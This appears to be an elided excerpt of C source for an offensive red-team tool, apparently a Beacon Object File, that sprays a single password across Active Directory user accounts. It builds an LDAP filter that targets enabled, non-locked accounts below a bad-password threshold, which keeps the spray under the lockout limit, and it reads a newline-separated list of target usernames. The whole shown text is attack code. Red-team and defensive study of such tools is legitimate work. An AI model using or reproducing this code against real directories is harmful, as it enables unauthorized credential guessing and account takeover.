...
HRESULT SprayUsers(_In_ IDirectorySearch *pContainerToSearch, _In_ LPCWSTR lpwSprayPasswd, _In_ LPCWSTR lpwFilter, _In_ BOOL bLdapAuth, _In_ LPCWSTR lpwMaxBadPwdCount) {
	...
	LPCWSTR lpwFormat = L"(&(objectClass=user)(objectCategory=person)(!(userAccountControl:1.2.840.113556.1.4.803:=2))(!(lockoutTime>=1))(!(badPwdCount>=%ls))(sAMAccountName=%ls))"; // Only enabled accounts
...
//		lpwFilter = L"*";
	...
	MSVCRT$swprintf_s(wcSearchFilter, BUF_SIZE, lpwFormat, lpwMaxBadPwdCount, lpwFilter);
...
VOID go(IN PCHAR Args, IN ULONG Length) {
	...
	char* str_tmp = MSVCRT$malloc(userlistLength + 1);
	MSVCRT$memset(str_tmp, 0, userlistLength + 1);
	int j = 0;
	...
	for(int i=0; i<userlistLength; i++){
		...
		if(userlistData[i] == 0x0a){
			...
			MSVCRT$memcpy(str_tmp, userlistData + j, i-j);
			MSVCRT$swprintf(ws, L"%S", str_tmp);
